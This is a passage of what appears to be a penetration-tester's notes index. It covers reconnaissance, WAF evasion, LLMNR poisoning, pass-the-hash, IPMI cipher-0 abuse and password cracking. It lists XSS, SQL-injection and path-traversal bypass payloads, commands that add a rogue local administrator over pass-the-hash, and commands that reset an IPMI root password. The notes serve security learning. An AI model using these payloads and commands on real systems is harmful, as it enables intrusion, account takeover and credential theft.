546\n# -c: Color in output\n# \u2013hc 404: Hide 404 code responses\n# -t 200: Concurrent Threads\n# -u http://nunchucks.htb/: Target URL\n# -w /usr/share/dirb/wordlists/common.txt: Wordlist \n# -H \u201cHost: FUZZ.nunchucks.htb\u201d: Header. Also with \"FUZZ\" we indicate the injection point for payloads\n# \u2013hl 546: Filter out responses with a specific number of lines. In this case, 546\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#dnsenum_1","title":"dnsenum","text":"<p>Using dnsenum.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#bash-script-with-dig-and-seclist","title":"Bash script with dig and seclist","text":"<p>Bash script, using Sec wordlist:</p> <pre><code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.example.com @$ip | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#27-vhost-enumeration","title":"2.7. VHOST enumeration","text":"<p>A virtual host (<code>vHost</code>) is a feature that allows several websites to be hosted on a single server.  At the core of\u00a0<code>virtual hosting</code>\u00a0is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the\u00a0<code>HTTP Host</code>\u00a0header, a piece of information included in every\u00a0<code>HTTP</code>\u00a0request sent by a web browser. The key difference between\u00a0<code>VHosts</code>\u00a0and\u00a0<code>subdomains</code>\u00a0is their relationship to the\u00a0<code>Domain Name System (DNS)</code>\u00a0and the web server's configuration.</p> <p>There are 3 ways to configure virtual hosts:</p> <ol> <li><code>Name-Based Virtual Hosting</code>: This method relies solely on the\u00a0<code>HTTP Host header</code>\u00a0to distinguish between websites. It is the most common and flexible method, as it doesn't require multiple IP addresses. It requires the web server to support name-based\u00a0<code>virtual hosting</code>\u00a0and can have limitations with certain protocols like\u00a0<code>SSL/TLS</code>.</li> <li><code>IP-Based Virtual Hosting</code>: This type of hosting assigns a unique IP address to each website hosted on the server. The server determines which website to serve based on the IP address to which the request was sent. It doesn't rely on the\u00a0<code>Host header</code>, can be used with any protocol, and offers better isolation between websites. Still, it requires multiple IP addresses, which can be expensive and less scalable.</li> <li><code>Port-Based Virtual Hosting</code>: Different websites are associated with different ports on the same IP address. For example, one website might be accessible on port 80, while another is on port 8080.\u00a0<code>Port-based virtual hosting</code>\u00a0can be used when IP addresses are limited, but it\u2019s not as common or user-friendly as\u00a0<code>name-based virtual hosting</code>\u00a0and might require users to specify the port number in the URL.</li> </ol> <p>In essence, the\u00a0<code>Host</code>\u00a0header functions as a switch, enabling the web server to dynamically determine which website to serve based on the domain name requested by the browser.</p> <p>vHost Fuzzing</p> <pre><code># use a vhost dictionary file\ncp /usr/share/wordlists/secLists/Discovery/DNS/namelist.txt ./vhosts\n\ncat ./vhosts | while read vhost;do echo \"\\n********\\nFUZZING: ${vhost}\\n********\";curl -s -I http://$ip -H \"HOST: ${vhost}.example.com\" | grep \"Content-Length: \";done\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#vhost-fuzzing-with-ffuf","title":"vHost Fuzzing with ffuf","text":"<pre><code># Virtual Host enumeration\n# use a vhost dictionary file\ncp /usr/share/wordlists/secLists/Discovery/DNS/namelist.txt ./vhosts\n\nffuf -w ./vhosts -u http://$ip -H \"HOST: FUZZ.example.com\" -fs 612\n# `-w`: Path to our wordlist\n# `-u`: URL we want to fuzz\n# `-H \"HOST: FUZZ.randomtarget.com\"`: This is the `HOST` Header, and the word `FUZZ` will be used as the fuzzing point.\n# `-fs 612`: Filter responses with a size of 612, default response size in this case.\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#vhost-fuzzing-with-gobuster","title":"vHost Fuzzing with gobuster","text":"<p>There are a couple of things you need to prepare to brute force\u00a0<code>Host</code>\u00a0headers:</p> <ol> <li><code>Target Identification</code>: First, identify the target web server's IP address. This can be done through DNS lookups or other reconnaissance techniques.</li> <li><code>Wordlist Preparation</code>: Prepare a wordlist containing potential virtual host names. You can use a pre-compiled wordlist, such as SecLists, or create a custom one based on your target's industry, naming conventions, or other relevant information.</li> </ol> <pre><code>gobuster vhost -u http://$ip -w &lt;wordlist_file&gt; --append-domain\n# The\u00a0`-u`\u00a0flag specifies the target URL\n# The\u00a0`-w`\u00a0flag specifies the wordlist file \n# The\u00a0`--append-domain`\u00a0flag appends the base domain to each word in the wordlist.\n</code></pre> <p>and feroxbuster.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#28-certificate-enumeration","title":"2.8. Certificate enumeration","text":"<p>SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use (for instance, in gathering information to prepare a phising attack).</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#sslyze-and-sslabs","title":"sslyze and sslabs","text":"<p>For this we can use:  - sslyze - ssllabs by Qalys - https://ciphersuite.info.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#nmap_4","title":"nmap","text":"<p>Also, you can use a script for nmap:</p> <pre><code>nmap --script ssl-enum-ciphers &lt;HOSTNAME&gt;\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#virustotal","title":"virustotal","text":"<p>virustotal.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#crtsh-with-curl","title":"crt.sh with curl","text":"<p>crt.sh: it enables the verification of issued digital certificates for encrypted Internet connections. This is intended to enable the detection of false or maliciously issued certificates for a domain.</p> <pre><code># Get all subdomais with that digital certificate\ncurl -s https://crt.sh/\\?q\\=example.com\\&amp;output\\=json | jq .\n\n# Filter all by unique subdomain\ncurl -s https://crt.sh/\\?q\\=example.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\n# With the list of unique subdomains, list all the Company hosted servers\nfor i in $(cat subdomainlist);do host $i | grep \"has address\" | grep example.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done\n\n# Find all 'dev' subdomains on facebook.com using curl and jq:\ncurl -s \"https://crt.sh/?q=facebook.com&amp;output=json\" | jq -r '.[]\n | select(.name_value | contains(\"dev\")) | .name_value' | sort -u\n# -s  -s \"https://crt.sh/?q=facebook.com&amp;output=json\":his command fetches the JSON output from crt.sh for certificates matching the domain\u00a0`facebook.com`.  : \n\n\ncurl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n# curl -s: Issue the request with minimal output.\n# https://crt.sh/?q=&lt;DOMAIN&gt;&amp;output=json: Ask for the json output.\n# jq -r '.[]' \"\\(.name_value)\\n\\(.common_name)\"': Process the json output and print certificate's name value and common name one per line.\n# sort -u: Sort alphabetically the output provided and removes duplicates.\n\n# We also can manually perform this operation against a target using OpenSSL via:\nopenssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$'HEAD / HTTP/1.0\\r\\n\\r' -connect \"${TARGET}:${PORT}\" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\\n|g' -e 's|^\\*.*||g' | tr -d ',' | sort -u\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#censysio","title":"censys.io","text":"<p>https://censys.io: We can navigate to https://search.censys.io/certificates or https://crt.sh and introduce the domain name of our target organization to start discovering new subdomains.</p>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#the-harvester","title":"The Harvester","text":"<p>The Harvester: simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company's attack surface. The tool collects <code>emails</code>, <code>names</code>, <code>subdomains</code>, <code>IP addresses</code>, and <code>URLs</code> from various public data sources for passive information gathering. It has modules. </p> <p>Automate the modules we want to launch:</p> <p>1. Create a list of sources, one per line, sources.txt.</p> <p>2. Execute:</p> <pre><code> cat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n</code></pre> <p>3. When the process finishes, extract all the subdomains found and sort them:</p> <pre><code>cat *.json | jq -r '.hosts[]' 2&gt;/dev/null | cut -d':' -f 1 | sort -u &gt; \"${TARGET}_theHarvester.txt\"\n</code></pre> <p>4. Merge all the passive reconnaissance files:</p> <pre><code>cat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txt\n$ cat facebook.com_subdomains_passive.txt | wc -l\n</code></pre>","tags":["pentest","information gathering","web"]},{"location":"information-gathering/#shodan_1","title":"Shodan","text":"<p>Shodan:  Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the <code>cut</code> command and run them through <code>Shodan</code>.</p> <pre><code>for i in $(cat ip-addresses.txt);do shodan host $i;done\n</code></pre> <p>With this we'll get an IP list, that we can use to search for DNS records.</p>","tags":["pentest","information gathering","web"]},{"location":"inmunity-debugger/","title":"Inmunity Debugger","text":"","tags":["python","python pentesting","tools"]},{"location":"inmunity-debugger/#installation","title":"Installation","text":"<p>https://www.immunityinc.com/products/debugger/</p>","tags":["python","python pentesting","tools"]},{"location":"inmunity-debugger/#firefox-api-hooking-with-inmunity-debugger","title":"Firefox API hooking with Inmunity Debugger","text":"<p>Firefox uses a function called PR_Write inside a dll module  called nss3.dll to write/submit data.  So once  the target enters his username and password and click  on login button the fireforx process will call  PR_Write function from nss3.dll module, if we setup a break point at that function we should see the data in clear text. </p> <p>Reference:-  https://developer.mozilla.org/en-docs/Mozilla/Projects/NSPR/Reference/PR_Write </p>","tags":["python","python pentesting","tools"]},{"location":"input-filtering/","title":"Input filtering","text":"<p>Input Filtering involves validating and sanitizing data received by the web application from users or external sources. Input filtering helps prevent security vulnerabilities such as SQL injection, cross-site scripting (XSS), and command injection. Some common techniques for input filtering include data validation, input validation, and input sanitization:</p> <ul> <li>Data Validation: Data validation checks whether the incoming data conforms to expected formats and constraints. Example: an email field.</li> <li>Input Validation: Input validation goes a step further by not only checking data formats but also assessing data for potential security threats. It detects and rejects input that could be used for attacks, such as SQL injection payloads or malicious scripts.</li> <li>Input Sanitization: Input sanitization involves cleaning or escaping input data to remove or neutralize potentially dangerous characters or content.</li> </ul>"},{"location":"input-filtering/#input-filtering-techniques","title":"Input filtering techniques","text":"<ul> <li>Content Security Policy (CSP): CSP is a security feature that controls which sources of content are allowed to be loaded by a web page. It helps prevent XSS attacks by specifying which domains are permitted sources for scripts, styles, images, and other resources.</li> <li>Cross-Site Request Forgery (CSRF) Protection: Filtering mechanisms can be used to implement CSRF protection, ensuring that incoming requests have valid anti-CSRF tokens to prevent attackers from tricking users into performing actions they didn't intend.</li> <li>Web Application Firewalls (WAFs): WAFs are security appliances or services that filter incoming HTTP requests to a web application. They use predefined rules and heuristics to detect and block malicious traffic. </li> <li>Regular Expression Filtering: Regular expressions (regex) can be used to filter and validate data against complex patterns. However, improper regex usage can introduce security  vulnerabilities, so careful crafting and testing of regex patterns are necessary.</li> </ul>"},{"location":"input-filtering/#evasion-techniques","title":"Evasion techniques","text":"<p>Web application defense mechanisms are proactive tools and techniques designed to protect and defend web applications against various security threats and vulnerabilities.</p> <p>Evasion in web application security testing refers to the practice of using various techniques and methods to bypass or  circumvent security mechanisms and controls put in place to protect a web application. </p>"},{"location":"input-filtering/#bypass-what","title":"Bypass what!","text":"<ul> <li>Authentication: Authentication mechanisms verify the identity of users and ensure that they have the appropriate permissions to access specific resources within the application. Common authentication methods include username and password, multi-factor authentication (MFA), and biometrics.</li> <li>Authorization: Authorization mechanisms determine what actions and resources users are allowed to access within the application once they have been authenticated. This includes defining roles, permissions, and access controls.</li> <li>Input Validation/Filtering: Input validation is the process of verifying and sanitizing data received from users or external sources to prevent malicious input that could lead to vulnerabilities like SQL injection, cross-site scripting (XSS), or command injection.</li> <li>Session Management: Session management mechanisms are responsible for creating, managing, and securing user  sessions. They include measures like session timeouts, secure session tokens, and protection against session fixation attacks.</li> <li>Cross-Site Request Forgery (CSRF) Protection: CSRF protection mechanisms prevent attackers from tricking users into making unauthorized requests to the application on their behalf. Tokens and anti-CSRF measures are often used for this purpose.</li> <li>Security Headers: HTTP security headers like Content  Security Policy (CSP), X-Content-Type-Options, and X-Frame-Options are used to control how web browsers should handle various aspects of web page security and rendering.</li> <li>Rate Limiting: Rate limiting mechanisms restrict the number of requests a user or IP address can make to the application within a specific time frame. This helps prevent brute force attacks and DDoS attempts.</li> <li>Web Application Firewalls (WAFs): WAFs are security  appliances or software solutions that sit between the web application and the client to monitor and filter incoming traffic. They can detect and block common web application attacks, such as SQL injection, cross-site scripting (XSS), and application-layer DDoS attacks. </li> <li>Intrusion Detection Systems (IDS) and Intrusion Prevention Systems  (IPS): IDS and IPS solutions inspect network and application traffic for signs of suspicious or malicious activity. IDS detects and alerts on potential threats, while IPS can take proactive measures to block or prevent malicious traffic.</li> <li>Proxies: In the context of web applications, proxies refer to intermediary servers that facilitate communication between a user's browser and the web server hosting the application. These proxies can serve various purposes, ranging from enhancing security and privacy to optimizing performance and managing network traffic.</li> </ul>"},{"location":"input-filtering/#bypass-how","title":"Bypass how!","text":"<ul> <li>Bypassing Web Application Firewalls (WAFs)/Proxy Rules: WAFs and proxies are designed to filter out malicious requests and prevent attacks like SQL injection or cross-site scripting (XSS). Evasion techniques may involve encoding, obfuscation, or fragmentation of malicious payloads to bypass the WAF's detection rules.</li> <li>Evading Intrusion Detection Systems (IDS): IDS systems monitor network traffic for signs of malicious activity. Evasion techniques can be used to hide or modify the payload of an attack so that it goes undetected by the IDS.</li> </ul>"},{"location":"input-filtering/#solutions-for-implementing-input-filtering","title":"Solutions for implementing input filtering","text":"<p>WAFs. An well known open source solution is ModSecurity. WAFs use rules to indicate what a filter must block or allow. These rules use Regular Expressions (RE or RegEx).</p> <p>See notes on regex.</p> <p>The best solution for protecting a webapp is whitelisting. But blacklisting methods are commonly found in deployments. Blacklisting includes a collection of well-known attacks. There are WAF bypasses.</p>"},{"location":"input-filtering/#waf-bypasses","title":"WAF bypasses","text":"<pre><code>################\n# XSS: alert('xss') and alert(1)\n################\nprompt('xss')\nprompt(8)\nconfirm('xss')\nconfirm(8)\nalert(/xss/.source)\nwindow[/alert/.source](8)\n\n################\n# XSS: alert(document.cookie)\n################\nwith(document)alert(cookie)\nalert(document['cookie'])\nalert(document[/cookie/.source])\nalert(document[(/coo/.source+/kie/.source])\n\n################\n# XSS: &lt;img src=x onerror=alert(1);&gt;\n################\n&lt;svg/onload=alert(1)&gt;\n&lt;video src=x onerror=alert(1);&gt;\n&lt;audio src=x onerror=alert(1);&gt;\n\n\n################\n# XSS: javascript:alert(document.cookie)\n################\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\n</code></pre> <pre><code>################\n# Blind SQL injection: 'or 1=1\n################\n' or 6=6\n' or 0x47=0x47\nor char(32)=''\nor 6 is not null\n\n################\n# Blind SQL injection: 'or 1=1\n################\n\nUNION ALL SELECT\n</code></pre> <pre><code>################\n#  Directory Traversals: /etc/passwd\n################\n/too/../etc/far/../passwd\n/etc//passwd\n/etc/ignore/../passwd\n/etc/passwd.......\n</code></pre> <pre><code>################\n#  Webshells: c99.php, r57.php, shell.aspx, cmd.jsp, CmdAsp.asp\n################\naugh.php\n</code></pre>"},{"location":"input-filtering/#fingerprinting-a-waf","title":"Fingerprinting a WAF","text":"<p>Tools: wafw00f and nmap script:</p> <pre><code>nmap -p 80 -script http-waf-detect $ip \nnmap -p 80 -script http-waf-fingerprint $ip \n</code></pre> <p>Detecting a WAF manually</p> <p>1. Cookies: Via cookie values.</p> WAF Cookie value Citrix netscaler ns_af, citrix_ns_id, NSC_ F5 BIG-IP ASM TS followed by a string with the regex:<code>^TS[a-zA-Z0-9]{3,6}</code> Barracuda barra_counter_session, BNi__BARRACUDA_LB_COOKIE <p>2. Server cloaking: WAFs can rewrite Server header to deceive attackers.</p> <p>3. Response codes: WAFs can also modify the HTTP response codes if the request is hostile.</p> <p>4. WAFs can be displayed in response bodies, like for instance mod_security, AQTRONIX WebKnight, dotDefender.</p> <p>5. Drop Action: WAFs can close the connections in the case they detect a malicious request.</p>"},{"location":"input-filtering/#client-side-filters","title":"Client-side filters","text":""},{"location":"input-filtering/#firefox","title":"Firefox","text":"<p>Browser addons such as NoScript is a whitelist-based security tool that basically disables all the executable web content (javascript, java, flash, silverlight...) and lets the user choose which sites are \"trusted\". Nice feature: anti-XSS protection.</p>"},{"location":"input-filtering/#internet-explorer","title":"Internet explorer","text":"<p>Internet Explorer, XSS Filter, which modifies reflected values in the following way:</p> <pre><code># This payload\n&lt;svg/onload=alert(1)&gt;\n# is transformed to\n&lt;svg/#nload=alert(1)&gt;\n</code></pre> <p>XSS Filter is enabled by default in the Internet but websites that want to opt-out of this protection can use the following response header:</p> <pre><code>X-XSS-Protection:0\n</code></pre> <p>Later on the Internet Explorer team introduced a new directive in the X-XSS-Protection header:</p> <pre><code>X-XSS-Protection:1; mode=block\n</code></pre> <p>With this directive, if a potential XSS attack is detected, the browser, rather than attempting to sanitize the page, will render a simple #. This directive has been implemented in other browsers.</p>"},{"location":"input-filtering/#chrome","title":"Chrome","text":"<p>Chrome has XSS Auditor. XSS Auditor is between the HTML Parser and the JS engine.</p> <p></p> <p>The filter analyzes both the inbound requests and the outbound. If executable code is found within the response, then it stops the script and generates a console alert.</p>"},{"location":"interactsh/","title":"Interactsh - An alternative to BurpSuite Collaborator","text":"<p>Interactsh is an open-source tool for detecting out-of-band interactions. It is a tool designed to detect vulnerabilities that cause external interactions.</p> <p>Website version: https://app.interactsh.com/</p>","tags":["web pentesting","proxy","servers","burpsuite","tools"]},{"location":"interactsh/#installation","title":"Installation","text":"<p>Download from: https://github.com/projectdiscovery/interactsh/</p> <pre><code>go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n</code></pre>","tags":["web pentesting","proxy","servers","burpsuite","tools"]},{"location":"interactsh/#basic-usage","title":"Basic Usage","text":"<pre><code>interactsh-client   \n</code></pre> <p>Cry for help:</p> <pre><code>interactsh-client  -h\n</code></pre> <p>Interactsh server runs multiple services and captures all the incoming requests. To host an instance of interactsh-server, you are required to setup:</p> <ol> <li>Domain name with custom host names and nameservers.</li> <li>Basic droplet running 24/7 in the background.</li> </ol>","tags":["web pentesting","proxy","servers","burpsuite","tools"]},{"location":"interactsh/#burpsuite-integrated","title":"Burpsuite integrated","text":"<p>interactsh-collaborator is Burp Suite extension developed and maintained by @wdahlenb</p>","tags":["web pentesting","proxy","servers","burpsuite","tools"]},{"location":"inveigh/","title":"Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh</p> <p>Mitre ATT&amp;CK lists this technique as\u00a0ID: T1557.001,\u00a0<code>Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay</code>.</p> <p>LLMNR &amp; NBT-NS poisoning is possible from a Windows host as well. </p> <p>Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. The repo contains the primary C# version as well as the legacy PowerShell version.</p> <p>Inveigh can listen to IPv4 and IPv6 and several other protocols, including\u00a0<code>LLMNR</code>, DNS,\u00a0<code>mDNS</code>, NBNS,\u00a0<code>DHCPv6</code>, ICMPv6,\u00a0<code>HTTP</code>, HTTPS,\u00a0<code>SMB</code>, LDAP,\u00a0<code>WebDAV</code>, and Proxy Auth.</p>","tags":["tools","windows","active","directory","ldap","server"]},{"location":"inveigh/#powershell-version","title":"Powershell version","text":"<p>The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section). Configurable parameters in inveigh: https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters</p> <pre><code># Install the module\nImport-Module .\\Inveigh.ps1\n\n# List parameters\n(Get-Command Invoke-Inveigh).Parameters\n\n# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.\nInvoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>","tags":["tools","windows","active","directory","ldap","server"]},{"location":"inveigh/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p>Before we can use the C# version of the tool, we have to compile the executable. </p> <pre><code>.\\Inveigh.exe\n</code></pre> <p>Results:</p> <pre><code>[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from \n</code></pre> <ul> <li><code>[+]</code>\u00a0 default option and enabled by default</li> <li><code>[ ]</code>\u00a0 disabled options .</li> </ul> <p>Console access: </p> <p>Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.</p> <pre><code># List commands\n&gt; HELP\n\n# view unique captured hashes\n&gt; \u00a0GET NTLMV2UNIQUE\n\n#  see which usernames we have collected.\nGET NTLMV2USERNAMES\n</code></pre>","tags":["tools","windows","active","directory","ldap","server"]},{"location":"invoke-the-hash/","title":"Invoke-TheHash","text":"<p>Collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"invoke-the-hash/#installation","title":"Installation","text":"<p>Download Powershell Invoke-TheHash fuctions from github repo:https://github.com/Kevin-Robertson/Invoke-TheHash. </p> <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution.</p> <pre><code>cd C:\\tools\\Invoke-TheHash\\\n\nImport-Module .\\Invoke-TheHash.psd1\n</code></pre>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"invoke-the-hash/#invoke-thehash-with-smb","title":"Invoke-TheHash with SMB","text":"<pre><code>Invoke-SMBExec -Target $ip -Domain &lt;DOMAIN&gt; -Username &lt;USERNAME&gt; -Hash 64F12CDDAA88057E06A81B54E73B949B -Command \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" -Verbose\n# Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.\n# we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.\n</code></pre> <p>How to generate a reverse shell.</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"invoke-the-hash/#invoke-thehash-with-wmi","title":"Invoke-TheHash with WMI","text":"<pre><code>Invoke-WMIExec -Target $machineName -Domain &lt;DOMAIN&gt; -Username &lt;USERNAME&gt; -Hash 64F12CDDAA88057E06A81B54E73B949B -Command  \"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add\" \n</code></pre> <p>How to generate a reverse shell.</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"ipmitool/","title":"IPMItool","text":"","tags":["pentesting","port 623","ipmi"]},{"location":"ipmitool/#ipmi-authentication-bypass-via-cipher-0","title":"IPMI Authentication Bypass via Cipher 0","text":"<p>Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.</p> <pre><code>use auxiliary/scanner/ipmi/ipmi_cipher_zero\n</code></pre> <p>Abuse this flaw with <code>ipmitool</code>:</p> <pre><code># Install\napt-get install ipmitool \n\n# Use Cipher 0 to dump a list of users. With -C 0 any password is accepted\nipmitool -I lanplus -C 0 -H  $ip -U root -P root user list \n\n# Change the password of root\nipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 \n</code></pre>","tags":["pentesting","port 623","ipmi"]},{"location":"jaws/","title":"JAWS - Just Another Windows (Enum) Script","text":"","tags":["pentesting","windows pentesting","enumeration"]},{"location":"jaws/#installation","title":"Installation","text":"<p>Github repo: https://github.com/411Hall/JAWS.</p>","tags":["pentesting","windows pentesting","enumeration"]},{"location":"jaws/#basis-usage","title":"Basis usage","text":"<p>Run from within CMD shell and write out to file.</p> <pre><code>CMD C:\\temp&gt; powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n</code></pre> <p>Run from within CMD shell and write out to screen.</p> <pre><code>CMD C:\\temp&gt; powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1\n</code></pre> <p>Run from within PS Shell and write out to file.</p> <pre><code>PS C:\\temp&gt; .\\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt\n</code></pre>","tags":["pentesting","windows pentesting","enumeration"]},{"location":"john-the-ripper/","title":"John the Ripper - A hash cracker and dictionary attack tool","text":"<p>John the Ripper (JTR or john) is one of those tools that can be used for several things: you can crack a hash and you can crack a file.</p>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#installation","title":"Installation","text":"<p>Download from: https://www.openwall.com/john/.</p> <p>--list=formats  // gives you a list of the formats</p>","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#crack-a-hash","title":"Crack a hash","text":"","tags":["pentesting","brute force","dictionary attack","enumeration"]},{"location":"john-the-ripper/#hash-single-crack-mode-attack","title":"Hash: Single Crack Mode attack","text":"<pre><code>john --format=sha256 hashes_to_crack.txt\n# --format=sha256: specifies that the hash format is SHA-256\n# hashes_to_crack.txt:  is the file name containing the hashes to be cracked \n</code></pre> <p>John will output the cracked passwords to the console and the file \"john.pot\" (~/.john/john.pot) to the current user's home directory. </p> <p>Furthermore, it will continue cracking the remaining hashes in the background, and we can check the progress by running:</p> <pre><code>john --show \n</code></pre> <p>Cheat sheet:</p> Hash Format Example Command Description afs <code>john --format=afs hashes_to_crack.txt</code> AFS (Andrew File System) password hashes bfegg <code>john --format=bfegg hashes_to_crack.txt</code> bfegg hashes used in Eggdrop IRC bots bf <code>john --format=bf hashes_to_crack.txt</code> Blowfish-based crypt(3) hashes bsdi <code>john --format=bsdi hashes_to_crack.txt</code> BSDi crypt(3) hashes crypt(3) <code>john --format=crypt hashes_to_crack.txt</code> Traditional Unix crypt(3) hashes des <code>john --format=des hashes_to_crack.txt</code> Traditional DES-based crypt(3) hashes dmd5 <code>john --format=dmd5 hashes_to_crack.txt</code> DMD5 (Dragonfly BSD MD5) password hashes dominosec <code>john --format=dominosec hashes_to_crack.txt</code> IBM Lotus Domino 6/7 password hashes EPiServer SID hashes <code>john --format=episerver hashes_to_crack.txt</code> EPiServer SID (Security Identifier) password hashes hdaa <code>john --format=hdaa hashes_to_crack.txt</code> hdaa password hashes used in Openwall GNU/Linux hmac-md5 <code>john --format=hmac-md5 hashes_to_crack.txt</code> hmac-md5 password hashes hmailserver <code>john --format=hmailserver hashes_to_crack.txt</code> hmailserver password hashes ipb2 <code>john --format=ipb2 hashes_to_crack.txt</code> Invision Power Board 2 password hashes krb4 <code>john --format=krb4 hashes_to_crack.txt</code> Kerberos 4 password hashes krb5 <code>john --format=krb5 hashes_to_crack.txt</code> Kerberos 5 password hashes LM <code>john --format=LM hashes_to_crack.txt</code> LM (Lan Manager) password hashes lotus5 <code>john --format=lotus5 hashes_to_crack.txt</code> Lotus Notes/Domino 5 password hashes md4-gen <code>john --format=md4-gen hashes_to_crack.txt</code> Generic MD4 password hashes md5 <code>john --format=md5 hashes_to_crack.txt</code> MD5 password hashes md5-gen <code>john --format=md5-gen hashes_to_crack.txt</code> Generic MD5 password hashes mscash <code>john --format=mscash hashes_to_crack.txt</code> MS Cache password hashes mscash2 <code>john --format=mscash2 hashes_to_crack.txt</code> MS Cache v2 password hashes mschapv2 <code>john --format=mschapv2 hashes_to_crack.txt</code> MS CHAP v2 password hashes mskrb5 <code>john --format=mskrb5 hashes_to_crack.txt</code> MS Kerberos 5 password hashes mssql05 <code>john --format=mssql05 hashes_to_crack.txt</code> MS SQL 2005 password hashes mssql <code>john --format=mssql hashes_to_crack.txt</code> MS SQL password hashes mysql-fast <code>john 